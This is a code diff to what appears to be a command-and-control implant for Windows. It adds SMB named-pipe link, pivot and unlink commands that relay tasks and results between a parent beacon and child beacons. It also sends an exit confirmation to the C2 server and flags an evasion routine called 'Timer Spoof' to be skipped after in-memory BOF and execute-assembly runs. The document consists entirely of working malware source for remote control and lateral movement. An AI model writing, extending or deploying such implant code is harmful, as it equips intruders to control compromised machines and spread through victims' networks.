@@ -38,11 +38,26 @@ static void Task_SendResult( PCHAR task_uuid, PVOID data, UINT32 len )
 static void Task_Exit( PCHAR task_uuid, PPARSER args )
 {
     G_AGENT;
-    Task_SendResult( task_uuid, nullptr, 0 );
+    // Send EXIT_MAGIC so the server can call TsAgentTerminate on receipt.
+    BYTE confirm = EXIT_MAGIC;
+    Task_SendResult( task_uuid, &confirm, 1 );
     Self->Ntdll.NtAllocateVirtualMemory( (HANDLE)-1, nullptr, 0, nullptr, 0, 0 );
-    // use NtTerminateProcess via direct syscall stub - for now call via kernel32
-    // kernel32!TerminateProcess wraps NtTerminateProcess
     Self->Krnl32.TerminateProcess( (HANDLE)-1, 0 );
+}
+
+// Unlink - close the named-pipe channel to a child SMB beacon.
+// args: [str pivot_uuid]  result: [36B pivot_uuid] (echo, so server knows which child)
+static void Task_Unlink( PCHAR task_uuid, PPARSER args )
+{
+    G_AGENT;
+    UINT32 uuid_len   = 0;
+    PCHAR  pivot_uuid = Psr_Str( args, &uuid_len );
+    if ( !pivot_uuid || uuid_len < 36 ) return;
+
+    PAIN_SMB_DATA* child = (PAIN_SMB_DATA*)Smb_Get( pivot_uuid );
+    if ( child ) Smb_Rm( child );
+
+    Task_SendResult( task_uuid, pivot_uuid, 36 );
 }
 
 // PWD - Return the current working directory
@@ -250,6 +265,153 @@ static void Task_Ls( PCHAR task_uuid, PPARSER args )
     Heap_Free( out_buf );
 }
 
+// Link - open a child SMB beacon's named pipe, read its checkin, relay to C2
+static void Task_Link( PCHAR task_uuid, PPARSER args )
+{
+    G_AGENT;
+
+    UINT32 path_len  = 0;
+    PCHAR  pipe_path = Psr_Str( args, &path_len );
+    if ( !pipe_path || path_len == 0 ) {
+        Task_SendResult( task_uuid, nullptr, 0 );
+        return;
+    }
+
+    PAIN_SMB_DATA* node = (PAIN_SMB_DATA*)Smb_Add( pipe_path );
+    if ( !node ) {
+        // A single 0xFF byte signals failure without matching the link magic
+        BYTE fail = 0xFF;
+        Task_SendResult( task_uuid, &fail, 1 );
+        return;
+    }
+
+    // Build result: [0x4C 'L'][node->CheckinBuf]
+    // CheckinBuf = [36B child UUID][checkin payload] - exactly what InternalHandler expects.
+    // The Go processData detects 0x4C to route child registration to the SMB listener.
+    UINT32 result_len = 1 + node->CheckinLen;
+    PBYTE  result     = (PBYTE)Heap_Alloc( result_len );
+    if ( !result ) return;
+
+    result[0] = 0x4C;
+    Mem_Copy( result + 1, node->CheckinBuf, node->CheckinLen );
+
+    Task_SendResult( task_uuid, result, result_len );
+    Heap_Free( result );
+}
+
+// Pivot - relay pending tasks to an SMB child and collect its results.
+// args: [str pivot_uuid][bytes relay_data]
+// result sent to Go: [0x50][36B child_uuid][encrypted_child_body]
+static void Task_Pivot( PCHAR task_uuid, PPARSER args )
+{
+    G_AGENT;
+
+    UINT32 uuid_len   = 0;
+    PCHAR  pivot_uuid = Psr_Str( args, &uuid_len );
+    if ( !pivot_uuid || uuid_len < 36 ) {
+        Self->Ntdll.DbgPrint( "[PIVOT] Exchange: missing pivot UUID\n" );
+        return;
+    }
+
+    UINT32 relay_len  = 0;
+    PBYTE  relay_data = Psr_Bytes( args, &relay_len );
+    if ( !relay_data || relay_len == 0 ) {
+        Self->Ntdll.DbgPrint( "[PIVOT] Exchange: no relay data\n" );
+        return;
+    }
+
+    PAIN_SMB_DATA* child = (PAIN_SMB_DATA*)Smb_Get( pivot_uuid );
+    if ( !child || !child->Handle ) {
+        Self->Ntdll.DbgPrint( "[PIVOT] Exchange: child not found for %s\n", pivot_uuid );
+        return;
+    }
+
+    Self->Ntdll.DbgPrint( "[PIVOT] Exchange: writing %d bytes to child %s\n", relay_len, pivot_uuid );
+
+    // Write [4B len][relay_data] to child pipe
+    UINT32 write_total = sizeof(UINT32) + relay_len;
+    PBYTE  write_buf   = (PBYTE)Heap_Alloc( write_total );
+    if ( !write_buf ) return;
+    Mem_Copy( write_buf,                  &relay_len, sizeof(UINT32) );
+    Mem_Copy( write_buf + sizeof(UINT32), relay_data, relay_len      );
+
+    DWORD written = 0;
+    BOOL  wok     = Self->Krnl32.WriteFile( child->Handle, write_buf, write_total, &written, nullptr );
+    Heap_Free( write_buf );
+    if ( !wok ) {
+        Self->Ntdll.DbgPrint( "[PIVOT] Exchange: WriteFile failed - child dead\n" );
+        Smb_Rm( child );
+        PBYTE dead = (PBYTE)Heap_Alloc( 1 + 36 );
+        if ( dead ) {
+            dead[0] = PIVOT_DEAD_MAGIC;
+            Mem_Copy( dead + 1, pivot_uuid, 36 );
+            Task_SendResult( task_uuid, dead, 1 + 36 );
+            Heap_Free( dead );
+        }
+        return;
+    }
+
+    Self->Ntdll.DbgPrint( "[PIVOT] Exchange: wrote %d bytes, waiting for child response\n", relay_len );
+
+    // Wait for child to process and write response
+    DWORD peek_len = 0;
+    while ( TRUE ) {
+        if ( !Self->Krnl32.PeekNamedPipe( child->Handle, nullptr, 0, nullptr, &peek_len, nullptr ) ) {
+            Self->Ntdll.DbgPrint( "[PIVOT] Exchange: PeekNamedPipe failed - child dead\n" );
+            Smb_Rm( child );
+            PBYTE dead = (PBYTE)Heap_Alloc( 1 + 36 );
+            if ( dead ) {
+                dead[0] = PIVOT_DEAD_MAGIC;
+                Mem_Copy( dead + 1, pivot_uuid, 36 );
+                Task_SendResult( task_uuid, dead, 1 + 36 );
+                Heap_Free( dead );
+            }
+            return;
+        }
+        if ( peek_len >= sizeof(UINT32) ) break;
+        Self->Krnl32.Sleep( 100 );
+    }
+
+    // Read child's full response: [4B pkg_len][36B child_uuid][XOR(task_uuid+result)]
+    PBYTE read_buf = (PBYTE)Heap_Alloc( peek_len );
+    if ( !read_buf ) return;
+
+    DWORD read_len = 0;
+    BOOL  rok      = Self->Krnl32.ReadFile( child->Handle, read_buf, peek_len, &read_len, nullptr );
+    if ( !rok || read_len <= sizeof(UINT32) ) {
+        Self->Ntdll.DbgPrint( "[PIVOT] Exchange: ReadFile failed or too small\n" );
+        Heap_Free( read_buf );
+        if ( !rok ) {
+            Smb_Rm( child );
+            PBYTE dead = (PBYTE)Heap_Alloc( 1 + 36 );
+            if ( dead ) {
+                dead[0] = PIVOT_DEAD_MAGIC;
+                Mem_Copy( dead + 1, pivot_uuid, 36 );
+                Task_SendResult( task_uuid, dead, 1 + 36 );
+                Heap_Free( dead );
+            }
+        }
+        return;
+    }
+
+    // Strip 4-byte length prefix → body = [36B child_uuid][encrypted_payload]
+    UINT32 body_len = read_len - sizeof(UINT32);
+    PBYTE  body     = read_buf + sizeof(UINT32);
+
+    Self->Ntdll.DbgPrint( "[PIVOT] Exchange: got %d-byte response from child\n", body_len );
+
+    // Build relay result: [1B PIVOT_RESULT_MAGIC][body]
+    UINT32 result_len = 1 + body_len;
+    PBYTE  result     = (PBYTE)Heap_Alloc( result_len );
+    if ( result ) {
+        result[0] = PIVOT_RESULT_MAGIC;
+        Mem_Copy( result + 1, body, body_len );
+        Task_SendResult( task_uuid, result, result_len );
+        Heap_Free( result );
+    }
+    Heap_Free( read_buf );
+}
+
 // BOF Execute - laod a COFF .o file, run go(), send output back
 static void Task_Bof( PCHAR task_uuid, PPARSER args )
 {
@@ -268,6 +430,10 @@ static void Task_Bof( PCHAR task_uuid, PPARSER args )
     Self->Bof.OutputBuf = nullptr;
     Self->Bof.OutputLen = 0;
     Self->Bof.OutputCap = 0;
+    // flag the main loop to skip Timer Spoof for one cycle after this BOF completes:
+    // execute-assembly leaves CLR thread pool threads alive; NtSetContextThread manipulation
+    // in Timer Spoof conflicts with CLR's thread interception and crashes the process.
+    Self->Bof.BofRan = TRUE;
 
     // COM must be initialized for BOFs that use CLR (execute-assembly) or OLEAUT32.
     // CoInitializeEx returns S_FALSE if already initialized - safe to call every time.
@@ -279,6 +445,8 @@ static void Task_Bof( PCHAR task_uuid, PPARSER args )
     }
 
     // run the BOF
+    // The pipe handle is protected for its entire lifetime (see Smb.cc CreateNamedPipeA).
+    // No bracket needed here - protection persists through CLR cleanup threads.
     Bof_Loader( bof_data, bof_size, arg_data, arg_size );
 
     // send whatever the BOF printed via BeaconOutput/BeaconPrintf
@@ -329,11 +497,14 @@ DECLFN BOOL Task_Dispatch( PVOID buf, UINT32 buf_len )
 
         switch ( cmd_id )
         {
-            case CMD_EXIT:   Task_Exit ( task_uuid, &args ); break;
-            case CMD_SHELL:  Task_Shell( task_uuid, &args ); break;
-            case CMD_PWD:    Task_Pwd  ( task_uuid, &args ); break;
-            case CMD_LS:     Task_Ls   ( task_uuid, &args ); break;
-            case CMD_BOF:    Task_Bof  ( task_uuid, &args ); break;
+            case CMD_EXIT:   Task_Exit  ( task_uuid, &args ); break;
+            case CMD_SHELL:  Task_Shell ( task_uuid, &args ); break;
+            case CMD_PWD:    Task_Pwd   ( task_uuid, &args ); break;
+            case CMD_LS:     Task_Ls    ( task_uuid, &args ); break;
+            case CMD_BOF:    Task_Bof   ( task_uuid, &args ); break;
+            case CMD_LINK:   Task_Link  ( task_uuid, &args ); break;
+            case CMD_PIVOT:  Task_Pivot ( task_uuid, &args ); break;
+            case CMD_UNLINK:      Task_Unlink     ( task_uuid, &args ); break;
             default: break;
         }
 
